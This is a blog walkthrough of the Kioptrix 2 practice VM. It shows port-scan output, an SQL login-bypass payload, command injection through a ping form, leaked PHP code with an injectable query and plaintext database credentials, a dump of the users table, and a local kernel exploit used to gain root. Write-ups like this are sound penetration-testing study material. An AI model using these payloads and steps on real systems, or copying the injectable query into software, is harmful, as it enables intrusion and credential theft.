---
layout: post
title: Kioptrix 2 - Walkthrough
---

## Port 80
So I started out scanning the target for both tcp and udp and found this.

```
host           port  proto  name             state    info
----           ----  -----  ----             -----    ----
192.168.1.105  22    tcp    ssh              open     OpenSSH 3.9p1 protocol 1.99
192.168.1.105  68    udp    dhcpc            unknown  
192.168.1.105  80    tcp    http             open     Apache httpd 2.0.52 (CentOS)
192.168.1.105  111   tcp    rpcbind          open     2 RPC #100000
192.168.1.105  111   udp    rpcbind          open     2 RPC #100000
192.168.1.105  443   tcp    ssl/http         open     Apache httpd 2.0.52 (CentOS)
192.168.1.105  631   tcp    ipp              open     CUPS 1.1
192.168.1.105  631   udp    ipp              unknown  
192.168.1.105  782   udp    hp-managed-node  unknown  
192.168.1.105  3306  tcp    mysql            open     MySQL unauthorized
```

Of this what seems most suspecious is the HTTP and HTTPS, and port 631. So I got started on port 80.
There I found a login. And I started sqlmap and started firing away.
Meanwhile I thought I would try some sql-login-bypass

```
' or '1'='1
```

So here we got some kind of ping functionality. First I tested just anything, and it outputed what I inputed.
Then I tried with javascript, and it got executed. Then I tried to input some php, but it got filtered. So I tried to input my own ip. And it worked, so I started inputing other commands.

```
mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
	//print "Connected to MySQL<br />";
	mysql_select_db("webapp");

	if ($_POST['uname'] != ""){
		$username = $_POST['uname'];
		$password = $_POST['psw'];
		$query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
		//print $query."<br>";
		$result = mysql_query($query);

		$row = mysql_fetch_array($result);
		//print "ID: ".$row['id']."<br />";
	}
```

I tried the credencials on the ssh but was not working. I also tried connecting to the database. But was also not allowed.

```
ERROR 1130 (HY000): Host '192.168.1.102' is not allowed to connect to this MySQL server
```

So I log in to the database with my new shell:

```

sh-3.00$ mysql -u john -p webapp
mysql -u john -p webapp
Enter password: hiroshima

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 24748 to server version: 4.1.22

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show dbs;
show dbs;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'dbs' at line 1
mysql> show databases;
show databases;
+----------+
| Database |
+----------+
| mysql    |
| test     |
| webapp   |
+----------+
3 rows in set (0.00 sec)

mysql> use webapp
use webapp
Database changed
mysql> show tables;
show tables;
+------------------+
| Tables_in_webapp |
+------------------+
| users            |
+------------------+
1 row in set (0.00 sec)

mysql> select * from users;
select * from users;
+------+----------+------------+
| id   | username | password   |
+------+----------+------------+
|    1 | admin    | 5afac8d85f |
|    2 | john     | 66lajGGbla |
+------+----------+------------+
2 rows in set (0.00 sec)
```

But none of those users worked to give me a ssh-session.

I did some enumeration and saw that nmap was installed so I tried the nmap-interactive trick. But it didn't work.

Linux version 2.6.9-55.EL (mockbuild@builder6.centos.org) (gcc version 3.4.6 20060404 (Red Hat 3.4.6-8)) #1 Wed May 2 13:52:16 EDT 2007

Then I started looking for kernel-exploits and found this one

```
/usr/share/exploitdb/platforms/linux/local/9542.c
```

So I compiled it and then ran it, and it gave me root.
